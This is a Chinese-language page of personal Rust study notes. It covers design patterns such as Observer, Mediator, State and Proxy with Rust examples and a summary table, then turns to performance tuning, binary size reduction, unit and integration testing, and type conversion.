<h4 id="使用场景-6"><a class="header" href="#使用场景-6">使用场景</a></h4>
<p>将一组对象之间的交互关系（或者说依赖关系）从多对多（网状关系）转换为一对多（星状关系）。原来一个对象要跟n个对象交互，现在只需要跟一个中介对象交互，从而最小化对象之间的交互关系，降低了代码的复杂度，提高了代码的可读性和可维护性。</p>
<p>《图解设计模式》举得例子很好。一个GUI程序，每个组件的状态都会影响其他组件的状态，比如选择了显示密码那么密码输入框就要显示字符，否则显示<code>*</code>。这时候如果有一个统一的管理者，每个组件向他发送消息就好了，然后他发送消息通知每个组件。</p>
<p>这个思想还有一个很重要的应用，是防止并发死锁。让一个中介对象来管理全部资源，需要资源的其他对象向中介请求。比如一个聊天客户端，每一个用户有两个进程负责收、发。那么当一个用户群发的时候，难道需要同时获得所有的<code>发进程</code>？可以不用。而是创建一个<code>中介进程</code>，把群发变成N个向单个用户发送消息的Message，通过channal传输，再让中介进程通知<code>发进程</code>发消息。</p>
<h3 id="17-observer-模式"><a class="header" href="#17-observer-模式">17. Observer 模式</a></h3>
<h4 id="使用场景-7"><a class="header" href="#使用场景-7">使用场景</a></h4>
<p>参考 https://zhuanlan.zhihu.com/p/158537313 。不是很懂这个和Mediator的关系。他们肯定有相似之处。</p>
<p>比如，最早智能手机上的3D平衡球游戏，我们要检测球有没有碰到洞口。那么，我们可以把洞口当作一个观察者，把这个观察者注册给球<code>addObserver</code>，每当球移动的时候，我们都把球当前的坐标发给注册者<code>notifyObserver</code>，Observer的会接受消息并作出相应的动作<code>update</code>。</p>
<h4 id="介绍-8"><a class="header" href="#介绍-8">介绍</a></h4>
<p><img src="Language/Rust/Practice/../images/image-20210817220518006.png" alt="image-20210817220518006" /></p>
<h4 id="代码-8"><a class="header" href="#代码-8">代码</a></h4>
<p><a href="https://dev.to/brookzerker/observer-pattern-in-rust-57hl">https://dev.to/brookzerker/observer-pattern-in-rust-57hl</a> 用Rust写并不是这么简单的事情，因为往Subject里面添加observer注定要涉及到observer生命周期的问题，根据下面的需求，subject持有弱引用，object用强引用挺合适的。（逃避生命周期的做法）</p>
<blockquote>
<p>当subject析构的时候，observer不能持有一个subject的野指针。但是subject是可以先于observer析构的。</p>
</blockquote>
<p>看了网上很多不同的实现方法，其实围绕的不同场景也有不同的做法——有时候Observer和Subject可能会一一对应，或者一对多，或者多对多。</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>use std::rc::Weak;
// 通知的事件
struct Event{x: i32};
// Subject
// 这里没有删除。通过弱引用的方式，如果指向的对象被析构了会返回None，这个时候我们再删除，相当于是惰性删除。
trait Subject {
    fn register(&amp;mut self, observer: Weak&lt;dyn Observer&gt;);
    fn notify(&amp;mut self);
}
// Observer on_notify=update
trait Observer {
    fn on_notify(&amp;self, event: &amp;Event);
}
<span class="boring">}
</span></code></pre></pre>
<p>下面这个例子是上面那个球进洞的例子，不过是一维的</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>// Concrete subject
struct Ball{
    observers : Vec&lt;Weak&lt;dyn Observer&gt;&gt;,
    x : i32,
}
// Concrete observer
struct Hole {
    x : i32,
}
<span class="boring">}
</span></code></pre></pre>
<p>接口的实现</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>impl Subject for Ball {
    fn register(&amp;mut self, observer: Weak&lt;dyn Observer&gt;) {
        self.observers.push(observer);
    }

    fn notify(&amp;mut self, event: Event) {
        for index in 0..self.observers.len() {
            if let Some(observer) = self.observers[index].upgrade() {
                observer.on_notify(&amp;event)
            } else {
                self.observers.swap_remove(index);
            }            
        }
        // 用迭代器会违反Rust的借用原则
        // for observer in self.observers.iter().enumerate() {
        //     if let Some(observer) = observer.1.upgrade() {
        //         observer.on_notify(&amp;event);
        //     } else {    
        //         self.observers.swap_remove(observer.0);
        //     }
        // }
    }
}
impl Observer for Hole {
    fn on_notify(&amp;self, event: &amp;Event) {
        if event.x == self.x {
            println!(&quot;Ball in Hole&quot;);
        };
    }
}
<span class="boring">}
</span></code></pre></pre>
<p>其他的代码。需要注意的是Rust中的弱引用，是从强引用中延伸出来的。如果强引用计数为0的话，就会返回None。</p>
<pre><pre class="playground"><code class="language-rust">impl Ball {
    fn go(&amp;mut self, delta: i32){
        self.x += delta;
        self.notify(Event{x:self.x});
    }
}
fn main(){
    let mut ball = Ball{ observers: vec![], x: 0 };
    let hole1 = Rc::new(Hole{ x: 1 });
    let hole2 = Rc::new(Hole{ x: -1 });
    let weak1 = Rc::downgrade(&amp;hole1.clone());
    let weak2 = Rc::downgrade(&amp;hole2.clone());
    ball.register(weak1);
    ball.register(weak2);
    ball.go(2);
    ball.go(-1);
    drop(hole2);
    ball.go(-2);
}
</code></pre></pre>
<h3 id="18-memento-模式"><a class="header" href="#18-memento-模式">18. Memento 模式</a></h3>
<h4 id="使用场景-8"><a class="header" href="#使用场景-8">使用场景</a></h4>
<p>实现如 Undo Redo History Snapshot 的功能</p>
<h4 id="介绍-9"><a class="header" href="#介绍-9">介绍</a></h4>
<p>备忘录（Memento）模式的定义：在不破坏封装性的前提下，捕获一个对象的内部状态，并在该对象之外保存这个状态，以便以后当需要时能将该对象恢复到原先保存的状态。该模式又叫快照模式。</p>
<p>备忘录模式的主要角色如下。</p>
<ol>
<li>
<p>发起人（Originator）角色：记录当前时刻的内部状态信息，提供创建备忘录和恢复备忘录数据的功能，实现其他业务功能，它可以访问备忘录里的所有信息。</p>
</li>
<li>
<p>备忘录（Memento）角色：负责存储发起人的内部状态，在需要的时候提供这些内部状态给发起人。</p>
</li>
<li>
<p>管理者（Caretaker）角色：对备忘录进行管理，提供保存与获取备忘录的功能（通知Originator），但其不能对备忘录的内容进行访问与修改。</p>
<p><img src="Language/Rust/Practice/../images/3-1Q119130413927.gif" alt="备忘录模式的结构图" /></p>
</li>
</ol>
<h4 id="代码-9"><a class="header" href="#代码-9">代码</a></h4>
<h3 id="19-state-模式"><a class="header" href="#19-state-模式">19. State 模式</a></h3>
<h4 id="使用场景-9"><a class="header" href="#使用场景-9">使用场景</a></h4>
<p>存在复杂状态和复杂处理的时候。</p>
<h4 id="介绍-10"><a class="header" href="#介绍-10">介绍</a></h4>
<p>在软件开发过程中，应用程序中的部分对象可能会根据不同的情况做出不同的行为，我们把这种对象称为有状态的对象，而把影响对象行为的一个或多个动态变化的属性称为状态。当有状态的对象与外部事件产生互动时，其内部状态就会发生改变，从而使其行为也发生改变。像是有限状态机。根据之前的编程经验，用一个 <code>enum State</code>表示状态在结合<code>match</code>可以完成。</p>
<p>状态模式的解决思想是：当控制一个对象状态转换的条件表达式过于复杂时，把相关“判断逻辑”提取出来，用各个不同的类进行表示，系统处于哪种情况，直接使用相应的状态类对象进行处理，这样能把原来复杂的逻辑判断简单化，消除了 if-else、switch-case 等冗余语句，代码更有层次性，并且具备良好的扩展力。但是代码也随之复杂了。</p>
<p><img src="Language/Rust/Practice/../images/3-1Q11615412U55.gif" alt="状态模式的结构图" /></p>
<p>状态之间的转移，可以用程序来生成代码。</p>
<h3 id="20--flyweight-模式"><a class="header" href="#20--flyweight-模式">20.  Flyweight 模式</a></h3>
<h4 id="使用场景-10"><a class="header" href="#使用场景-10">使用场景</a></h4>
<p>当一个系统中存在大量重复对象的时候，我们就可以利用享元模式，将对象设计成享元，在内存中只保留一份实例，供多处代码引用，这样可以减少内存中对象的数量，以起到节省内存的目的。实际上，不仅仅相同对象可以设计成享元，对于相似对象，我们也可以将这些对象中相同的部分（字段），提取出来设计成享元，让这些大量相似对象引用这些享元。</p>
<h3 id="21-proxy-模式"><a class="header" href="#21-proxy-模式">21. Proxy 模式</a></h3>
<h4 id="使用场景-11"><a class="header" href="#使用场景-11">使用场景</a></h4>
<p><strong>想在访问一个类时做一些控制</strong>。通常有以下使用场景： 1、远程代理。 2、虚拟代理。 3、Copy-on-Write 代理。 4、保护（Protect or Access）代理。 5、<strong>Cache代理</strong>。 6、防火墙（Firewall）代理。 7、同步化（Synchronization）代理。 8、智能引用（Smart Reference）代理。 </p>
<p>其实和适配器模式差不多，再封装一套接口出来，适配器是为了让原先的接口适应不同的场景，代理模式是并不是改变原先的接口，而是在原先接口的基础上在做一些额外的控制。这么看倒是很像装饰模式。</p>
<p><strong>代理与其服务对象</strong>遵循同一接口，使得自己和服务对象可以互换。例子的话，我想起了trait<code>Read</code>和trait <code>BufRead</code>。如果你的类实现了<code>Read</code>，就可以先套一个<code>BufReader</code>（实现了<code>BufRead</code>）在去read，当然你的类也可以直接去read。</p>
<h3 id="22-command-模式"><a class="header" href="#22-command-模式">22. Command 模式</a></h3>
<p>将方法的请求者与实现者解耦</p>
<h4 id="使用场景-12"><a class="header" href="#使用场景-12">使用场景</a></h4>
<ol>
<li><strong>请求调用者</strong>需要与<strong>请求接收者</strong>解耦时，命令模式可以使调用者和接收者不直接交互。</li>
<li>系统随机请求命令或经常增加、删除命令时，命令模式可以方便地实现这些功能。</li>
<li>当系统需要执行一组操作时，命令模式可以定义宏命令来实现该功能。</li>
<li>当系统需要支持命令的撤销（Undo）操作和恢复（Redo）操作时，可以将命令对象存储起来，采用备忘录模式来实现。</li>
</ol>
<h3 id="23-interpreter-模式"><a class="header" href="#23-interpreter-模式">23. Interpreter 模式</a></h3>
<h4 id="使用场景-13"><a class="header" href="#使用场景-13">使用场景</a></h4>
<p>在软件开发中，会遇到有些问题多次重复出现，而且有一定的相似性和规律性。如果将它们归纳成一种简单的语言(DSL)，那么这些问题实例将是该语言的一些句子，这样就可以用“编译原理”中的解释器模式来实现了。</p>
<h2 id="总结-4"><a class="header" href="#总结-4">总结</a></h2>
<p>http://c.biancheng.net/view/8462.html</p>
<div class="table-wrapper"><table><thead><tr><th>分类</th><th>设计模式</th><th>简述</th><th>一句话归纳</th><th>目的</th><th>生活案例</th></tr></thead><tbody>
<tr><td>创建型设计模式 （简单来说就是用来创建对象的）</td><td>工厂模式（Factory Pattern）</td><td>不同条件下创建不同实例</td><td>产品标准化，生产更高效</td><td>封装创建细节</td><td>实体工厂</td></tr>
<tr><td>单例模式（Singleton Pattern）</td><td>保证一个类仅有一个实例，并且提供一个全局访问点</td><td>世上只有一个我</td><td>保证独一无二</td><td>CEO</td><td></td></tr>
<tr><td>原型模式（Prototype Pattern）</td><td>通过拷贝原型创建新的对象</td><td>拔一根猴毛，吹出千万个</td><td>高效创建对象</td><td>克隆</td><td></td></tr>
<tr><td>建造者模式（Builder Pattern）</td><td>用来创建复杂的复合对象</td><td>高配中配和低配，想选哪配就哪配</td><td>开放个性配置步骤</td><td>选配</td><td></td></tr>
<tr><td>结构型设计模式 （关注类和对象的组合）</td><td>代理模式（Proxy Pattern）</td><td>为其他对象提供一种代理以控制对这个对象的访问</td><td>没有资源没时间，得找别人来帮忙</td><td>增强职责</td><td>媒婆</td></tr>
<tr><td>外观模式（Facade Pattern）</td><td>对外提供一个统一的接口用来访问子系统</td><td>打开一扇门，通向全世界</td><td>统一访问入口</td><td>前台</td><td></td></tr>
<tr><td>装饰器模式（Decorator Pattern）</td><td>为对象添加新功能</td><td>他大舅他二舅都是他舅</td><td>灵活扩展、同宗同源</td><td>煎饼</td><td></td></tr>
<tr><td>享元模式（Flyweight Pattern）</td><td>使用对象池来减少重复对象的创建</td><td>优化资源配置，减少重复浪费</td><td>共享资源池</td><td>全国社保联网</td><td></td></tr>
<tr><td>组合模式（Composite Pattern）</td><td>将整体与局部（树形结构）进行递归组合，让客户端能够以一种的方式对其进行处理</td><td>人在一起叫团伙，心在一起叫团队</td><td>统一整体和个体</td><td>组织架构树</td><td></td></tr>
<tr><td>适配器模式（Adapter Pattern）</td><td>将原来不兼容的两个类融合在一起</td><td>万能充电器</td><td>兼容转换</td><td>电源适配</td><td></td></tr>
<tr><td>桥接模式（Bridge Pattern）</td><td>将两个能够独立变化的部分分离开来</td><td>约定优于配置</td><td>不允许用继承</td><td>桥</td><td></td></tr>
<tr><td>行为型设计模式 （关注对象之间的通信）</td><td>模板模式（Template Pattern）</td><td>定义一套流程模板，根据需要实现模板中的操作</td><td>流程全部标准化，需要微调请覆盖</td><td>逻辑复用</td><td>把大象装进冰箱</td></tr>
<tr><td>策略模式（Strategy Pattern）</td><td>封装不同的算法，算法之间能互相替换</td><td>条条大道通罗马，具体哪条你来定</td><td>把选择权交给用户</td><td>选择支付方式</td><td></td></tr>
<tr><td>责任链模式（Chain of Responsibility Pattern）</td><td>拦截的类都实现统一接口，每个接收者都包含对下一个接收者的引用。将这些对象连接成一条链，并且沿着这条链传递请求，直到有对象处理它为止。</td><td>各人自扫门前雪，莫管他们瓦上霜</td><td>解耦处理逻辑</td><td>踢皮球</td><td></td></tr>
<tr><td>迭代器模式（Iterator Pattern）</td><td>提供一种方法顺序访问一个聚合对象中的各个元素</td><td>流水线上坐一天，每个包裹扫一遍</td><td>统一对集合的访问方式</td><td>逐个检票进站</td><td></td></tr>
<tr><td>命令模式（Command Pattern）</td><td>将请求封装成命令，并记录下来，能够撤销与重做</td><td>运筹帷幄之中，决胜千里之外</td><td>解耦请求和处理</td><td>遥控器</td><td></td></tr>
<tr><td>状态模式（State Pattern）</td><td>根据不同的状态做出不同的行为</td><td>状态驱动行为，行为决定状态</td><td>绑定状态和行为</td><td>订单状态跟踪</td><td></td></tr>
<tr><td>备忘录模式（Memento Pattern）</td><td>保存对象的状态，在需要时进行恢复</td><td>失足不成千古恨，想重来时就重来</td><td>备份、后悔机制</td><td>草稿箱</td><td></td></tr>
<tr><td>中介者模式（Mediator Pattern）</td><td>将对象之间的通信关联关系封装到一个中介类中单独处理，从而使其耦合松散</td><td>联系方式我给你，怎么搞定我不管</td><td>统一管理网状资源</td><td>朋友圈</td><td></td></tr>
<tr><td>解释器模式（Interpreter Pattern）</td><td>给定一个语言，定义它的语法表示，并定义一个解释器，这个解释器使用该标识来解释语言中的句子</td><td>我想说”方言“，一切解释权都归我</td><td>实现特定语法解析</td><td>摩斯密码</td><td></td></tr>
<tr><td>观察者模式（Observer Pattern）</td><td>状态发生改变时通知观察者，一对多的关系</td><td>到点就通知我</td><td>解耦观察者与被观察者</td><td>闹钟</td><td></td></tr>
<tr><td>访问者模式（Visitor Pattern）</td><td>稳定数据结构，定义新的操作行为</td><td>横看成岭侧成峰，远近高低各不同</td><td>解耦数据结构和数据操作</td><td>KPI考核</td><td></td></tr>
<tr><td></td><td>委派模式（Delegate Pattern）</td><td>允许对象组合实现与继承相同的代码重用，负责任务的调用和分配</td><td>这个需求很简单，怎么实现我不管</td><td>只对结果负责</td><td>授权委托书</td></tr>
</tbody></table>
</div><div style="break-before: page; page-break-before: always;"></div><h1 id="性能优化"><a class="header" href="#性能优化">性能优化</a></h1>
<p>https://nnethercote.github.io/perf-book/build-configuration.html 阅读</p>
<h3 id="编译器优化"><a class="header" href="#编译器优化">编译器优化</a></h3>
<p>通过开启编译器优化可以获得很大的性能提升。<code>cargo build --release</code></p>
<p>在Cargo.toml里面开启链接时优化Link time Optimization，减少代码生成单元以便找到更多的优化点当然代价是很慢的编译速度。</p>
<pre><code>[profile.release]
lto = true
[profile.release]
codegen-units = 1
</code></pre>
<p><a href="https://nnethercote.github.io/perf-book/build-configuration.html#profile-guided-optimization">Profile-guided Optimization</a></p>
<p>用cargo clippy教你写代码。</p>
<h3 id="profiling"><a class="header" href="#profiling">Profiling</a></h3>
<p>找到程序性能的瓶颈/热点。</p>
<h3 id="inline-1"><a class="header" href="#inline-1">Inline</a></h3>
<p>有时候Inline可以优化，有时候反而会膨胀代码体积。。</p>
<h3 id="hashing-1"><a class="header" href="#hashing-1">Hashing</a></h3>
<p>标准库目前使用的<a href="https://en.wikipedia.org/wiki/SipHash">SipHash 1-3</a>防碰撞，但是相对慢。如果不需要考虑防碰撞并且哈希成为程序的性能瓶颈的话，可以使用其他的哈希算法。比如使用这个库<a href="https://crates.io/crates/rustc-hash"><code>rustc-hash</code></a>。 </p>
<h3 id="heap-allocation"><a class="header" href="#heap-allocation">Heap Allocation</a></h3>
<p>合理的预分配Vec的大小，可以减少复制和分配。如果想要C语言风格的栈上分配定长数组，可以考虑使用<a href="https://docs.rs/arrayvec/latest/arrayvec/#">arrayvec</a>。<a href="https://docs.rs/smallvec/1.9.0/smallvec/#">smallvec</a>智能的把小vec分配到栈上。String和Vec是一类东西。</p>
<p>Cow可以方便的实现Copy on write策略，适合读多写少的场景。</p>
<p>有时我们会为了避免复制，而保存引用，但是这往往会引入复杂的生命周期，如果不是性能瓶颈处，其实并不需要如此。当然，如果是性能瓶颈处，那么是值得的。</p>
<p>你也可以引入自定义的mallocator，比如<a href="https://crates.io/crates/tikv-jemallocator"><code>tikv-jemallocator</code></a>。或者针对使用场景编写一个。</p>
<h3 id="type-size"><a class="header" href="#type-size">Type Size</a></h3>
<p>enum中的各个选项应该有差不多的大小，否则会造成空间浪费。</p>
<p>如果说真的需要引入一个很大的type，可以用Box包起来。</p>
<h3 id="延迟计算"><a class="header" href="#延迟计算">延迟计算</a></h3>
<p>举个例子，</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>result/option.ok_or(cheap());
result/option.ok_or_else(|| expensive());
<span class="boring">}
</span></code></pre></pre>
<h3 id="iterators-1"><a class="header" href="#iterators-1">Iterators</a></h3>
<p>经有时返回一个<code>impl Iterator&lt;Item=T&gt;</code> 比 <code>Vec&lt;T&gt;</code>更好，避免了一次Vec的构造。</p>
<h3 id="io-2"><a class="header" href="#io-2">I/O</a></h3>
<p><code>print!</code>和<code>println!</code>都会加个锁，所以如果要重复输出的话可以手动去锁。如把下面的代码</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>for line in lines {
    println!(&quot;{}&quot;, line);
}
<span class="boring">}
</span></code></pre></pre>
<p>转化为</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>use std::io::Write;
let mut stdout = std::io::stdout();
let mut lock = stdout.lock();
for line in lines {
    writeln!(lock, &quot;{}&quot;, line)?;
}
// stdout is unlocked when `lock` is dropped
<span class="boring">}
</span></code></pre></pre>
<p>加个Buffer， <a href="https://doc.rust-lang.org/std/io/struct.BufReader.html"><code>BufReader</code></a> or <a href="https://doc.rust-lang.org/std/io/struct.BufWriter.html"><code>BufWriter</code></a>。如把下面的代码</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>use std::io::Write;
let mut out = std::fs::File::create(&quot;test.txt&quot;).unwrap();
for line in lines {
    writeln!(out, &quot;{}&quot;, line)?;
}
<span class="boring">}
</span></code></pre></pre>
<p>转化为</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>use std::io::{BufWriter, Write};
let mut out = std::fs::File::create(&quot;test.txt&quot;)?;
let mut buf = BufWriter::new(out);
for line in lines {
    writeln!(buf, &quot;{}&quot;, line)?;
}
buf.flush()?;
<span class="boring">}
</span></code></pre></pre>
<h3 id="machine-code"><a class="header" href="#machine-code">Machine Code</a></h3>
<p>利用机器的特性，如SIMD优化。<a href="https://doc.rust-lang.org/core/arch/index.html"><code>core::arch</code></a>会很有帮助。</p>
<h3 id="parallelism"><a class="header" href="#parallelism">Parallelism</a></h3>
<p><a href="https://crates.io/crates/rayon"><code>rayon</code></a> and <a href="https://crates.io/crates/crossbeam"><code>crossbeam</code></a> </p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="代码体积优化"><a class="header" href="#代码体积优化">代码体积优化</a></h1>
<p>https://github.com/johnthagen/min-sized-rust</p>
<p>Rust的代码体积膨胀是一个比较严重的问题。</p>
<ol>
<li>
<p><code>format!</code>宏有不小的代码膨胀问题，<code>ufmt</code>库想要解决这个问题。</p>
</li>
<li>
<p>异常会在相当程度上影响代码体积，比如<code>buf[i]</code>, <code>xxx().unwrap()</code>都会引入异常代码。不过也可以设置panic abort来减小异常展开的膨胀代码。</p>
<pre><code>[profile.release]
panic = &quot;abort&quot;
</code></pre>
</li>
<li>
<p>范型膨胀</p>
</li>
</ol>
<p>可以strip符号表</p>
<pre><code>[profile.release]
strip = true  # Automatically strip symbols from the binary.
</code></pre>
<p>打开size优化</p>
<pre><code>[profile.release]
opt-level = &quot;z&quot;  # Optimize for size.
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="测试最佳实践"><a class="header" href="#测试最佳实践">测试最佳实践</a></h1>
<blockquote>
<p>The Rust community thinks about tests in terms of two main categories: <em>unit tests</em> and <em>integration tests</em>. Unit tests are small and more focused, testing one module in isolation at a time, and can test private interfaces. Integration tests are entirely external to your library and use your code in the same way any other external code would, using only the public interface and potentially exercising multiple modules per test.</p>
</blockquote>
<h2 id="单元测试"><a class="header" href="#单元测试"><a href="https://doc.rust-lang.org/rust-by-example/testing/unit_testing.html">单元测试</a></a></h2>
<p>Rust本身就提供了一个轻量级的测试框架。</p>
<p><code>#[cfg(test)]</code>其实类似于条件编译，这样的话当我们build的时候就不会把测试代码编译进去，节省时间空间。通常的建议是把要测试的代码和测试代码放在同一个文件下，这样也方便测试私有的方法。</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>#[cfg(test)]
mod tests {
    // 注意这个惯用法：在 tests 模块中，从外部作用域导入所有名字。
    use super::*;

    #[test]
    fn test_add() {
        assert_eq!(add(1, 2), 3);
    }

    #[test]
    fn test_bad_add() {
        // 这个断言会导致测试失败。注意私有的函数也可以被测试！
        assert_eq!(bad_add(1, 2), 3);
    }
}	
<span class="boring">}
</span></code></pre></pre>
<p>测试的规则是什么呢？如果panic了就算测试不通过。我们经常会使用一些宏来帮助我们</p>
<ul>
<li><code>assert!()</code></li>
<li><code>assert_eq!()</code></li>
</ul>
<p>在某些特殊的情况下，我们想让程序panic，这个时候我们可以加上<code>#[should_panic]</code></p>
<h2 id="文档测试"><a class="header" href="#文档测试">文档测试</a></h2>
<p>你甚至可以在文档里头加测试，保证文档和代码的一致性。</p>
<pre><pre class="playground"><code class="language-rust">/// First line is a short summary describing function.
///
/// The next lines present detailed documentation. Code blocks start with
/// triple backquotes and have implicit `fn main()` inside
/// and `extern crate &lt;cratename&gt;`. Assume we're testing `doccomments` crate:
///
/// ```
/// let result = doccomments::add(2, 3);
/// assert_eq!(result, 5);
/// ```
pub fn add(a: i32, b: i32) -&gt; i32 {
    a + b
}
</code></pre></pre>
<h2 id="集成测试"><a class="header" href="#集成测试">集成测试</a></h2>
<p>通常是测试<code>lib</code>提供的所有外部接口，集成测试的文件单独放在一个文件夹<code>tests</code>中。<code>tests</code>中的每个文件都是单独的crate(编译单元)。</p>
<p>可是如果我想把我的测试代码分成好几个文件要怎么办？可以创建文件夹。比如创建<code>tests/common/mod.rs</code>就不会把<code>common</code>单独编译成一个crate了，并且每个在<code>tests</code>中的测试文件都可以把<code>common</code>当成一个模块使用。</p>
<p>因为<code>bin</code>无法进行集成测试，所以很多时候我们会让一个二进制工程就包含一个非常简单的<code>main.rs</code>，然后把大头都写在<code>lib</code>中方便测试。</p>
<hr />
<h3 id="测试覆盖率-cargo-llvm-cov"><a class="header" href="#测试覆盖率-cargo-llvm-cov">测试覆盖率 <a href="https://crates.io/crates/cargo-llvm-cov">cargo-llvm-cov</a></a></h3>
<p>By default, run tests (via <code>cargo test</code>), and print the coverage summary to stdout.</p>
<pre><code>cargo llvm-cov
</code></pre>
<p>To run <code>cargo run</code> instead of <code>cargo test</code>, use <code>run</code> subcommand.</p>
<pre><code>cargo llvm-cov run
</code></pre>
<h3 id="文件读写测试"><a class="header" href="#文件读写测试">文件读写测试</a></h3>
<p>如果代码涉及到文件/网络的I/O，有什么好办法可以测试呢？社区提供了下面这个思路：</p>
<blockquote>
<p>You can change the fn to be generic over <code>Read + Write</code> (rather than hardcoding <code>fs::read_to_string</code> / <code>fs::write</code>) and then provide a test/mock <code>Read/Write</code> impl that induces cases you’d like to test.</p>
</blockquote>
<p>或者我们可以使用<a href="https://crates.io/crates/tempdir">tempdir</a>，可以用来创建临时文件用于测试。</p>
<h3 id="mock测试"><a class="header" href="#mock测试">Mock测试</a></h3>
<p>mock是模拟、模仿的意思;作为一个名词，mock是能够模仿真实对象行为的模拟对象。他的基本思想其实很简单，比如要测试A，但是A依赖B，我们又不想让B影响A，我们就模拟出一个B来。</p>
<p>mock有下面一些类型：</p>
<ul>
<li>方法级别 mock: mock 的对象是一个函数调用，例如获取系统环境变量。</li>
<li>类级别 mock: mock 的对象是一个类，例如一个 HTTP server。</li>
<li>接口级别 mock: mock 的对象是一个 API 接口。</li>
<li>服务级别 mock: mock 的对象是整个服务。比如前端工程师自测试时，可以讲后端整个服务都 mock 掉，这其实等同于将后端的所有接口都 mock。</li>
</ul>
<p>不过具体要怎么实现mock其实是一个问题。Rust有<a href="https://crates.io/crates/mockall">mockall</a>，可以学习一下。</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="类型转换-2"><a class="header" href="#类型转换-2">类型转换</a></h1>
<p>Rust是强类型的语言，我们经常需要在各种类型中互相转换。介绍一些常用的转换写法和方法。</p>
<h2 id="as"><a class="header" href="#as">as</a></h2>
<p>as 最常用的场景是转换Rust中的基本数据类型。比如我们的算数运算就经常需要as。需要注意的是，最好是把小数据类型转换成大数据类型（比如u8-&gt;u32），而不要反过来，除非你非常笃定他不会溢出。</p>
<p>Rust中的字面量的默认类型，<code>'a'</code>是char，<code>b'a'</code>是u8。1是i32，可以在后面加上类型如1usize。</p>
<h2 id="自动deref"><a class="header" href="#自动deref">自动deref</a></h2>
<p>如果一个类型<code>T</code>实现了<code>Deref&lt;Target=U&gt;</code>，那么改类型T的<strong>引用</strong>或<strong>智能指针</strong>在使用的时候会被自动转换成类型<code>U</code>，类似的还有DerefMut。来看一个例子：</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>impl ops::Deref for String {
    type Target = str;

    #[inline]
    fn deref(&amp;self) -&gt; &amp;str {
        unsafe { str::from_utf8_unchecked(&amp;self.vec) }
    }
}
<span class="boring">}
</span></code></pre></pre>
<p>通过实现了这个Trait，<strong>任何需要<code>&amp;str</code>的地方都可以用<code>&amp;String</code>来代替</strong>。当然了，除非这个地方本来就既可以是<code>&amp;String</code>和<code>&amp;str</code>，那rust就会以为你就是要用<code>&amp;String</code>了，如果要用<code>&amp;str</code>需要显示的写出来。还有在match中也需要显式的写出来。</p>
<h2 id="from-和-into"><a class="header" href="#from-和-into">From 和 Into</a></h2>
<p>这是定义在标准库中的两个Trait。对于我们来说，我们只需要实现From，然后Into会自动实现。
另外注意一下Rust中实现的<a href="https://kaisery.github.io/trpl-zh-cn/ch10-02-traits.html#%E4%B8%BA%E7%B1%BB%E5%9E%8B%E5%AE%9E%E7%8E%B0-trait">孤儿规则</a>。实现的时候要导入。</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>pub trait Into&lt;T&gt;: Sized {
    /// Performs the conversion.
    #[stable(feature = &quot;rust1&quot;, since = &quot;1.0.0&quot;)]
    fn into(self) -&gt; T;
}

pub trait From&lt;T&gt;: Sized {
    /// Performs the conversion.
    #[lang = &quot;from&quot;]
    #[stable(feature = &quot;rust1&quot;, since = &quot;1.0.0&quot;)]
    fn from(_: T) -&gt; Self;
}
<span class="boring">}
</span></code></pre></pre>
<p>我们常用的例子有<code>let a = String::from(&quot;hello world&quot;)</code>。根据自动实现的规则，我们可以知道下面的代码是成立的：<code>let b:String = a.into();</code>
如果类型转换是可能发生错误的话，有<code>TryFrom</code>和<code>TryInto</code>。</p>
<h2 id="转化成字符串"><a class="header" href="#转化成字符串">转化成字符串</a></h2>
<p>编程中常常需要和字符串打交道。用户的输入、网络的数据、文件的读写等等IO相关的处理离不开字符串的处理。我们需要把字符串转换成我们需要的类型，也需要把我们的数据转换成字符串。
当然，有一些标准比如JSON肯定已经有第三方库的支持了。</p>
<p>我们看一下<a href="https://doc.rust-lang.org/src/core/str/mod.rs.html#2221">parse</a>。</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>pub fn parse&lt;F: FromStr&gt;(&amp;self) -&gt; Result&lt;F, F::Err&gt; {
    FromStr::from_str(self)
}
pub trait FromStr: Sized {
    type Err;
    fn from_str(s: &amp;str) -&gt; Result&lt;Self, Self::Err&gt;;
}
<span class="boring">}
</span></code></pre></pre>
<p>这是一个泛型函数，所以我们只需要让我们的类型实现了<code>FromStr</code>就可以从字符串中parse出来了。来看一个非常简单的例子：</p>
<pre><pre class="playground"><code class="language-rust">use std::str::FromStr;
#[derive(Debug)]
enum Color {
    Red,
    Blue,
}
// 根据孤儿规则，Color在这里定义，所以可以在这里实现
impl FromStr for Color{
    type Err = ();

    fn from_str(s: &amp;str) -&gt; Result&lt;Self, Self::Err&gt; {
        let s = s.to_lowercase();
        match s.as_ref() {
            &quot;red&quot; =&gt; Ok(Color::Red),
            &quot;blue&quot; =&gt; Ok(Color::Blue),
            _ =&gt; Err(())
        }
    }
}
fn main() {
    let x:Color = &quot;blue&quot;.parse().unwrap();
    println!(&quot;{:?}&quot;,x);
}
</code></pre></pre>
<h2 id="不同字符串之间的转化"><a class="header" href="#不同字符串之间的转化">不同字符串之间的转化</a></h2>
<p>刚刚介绍了parse将字符串解析成其他的类型，那么怎么把其他的类型转换成字符串呢？有<code>format!</code>宏。</p>
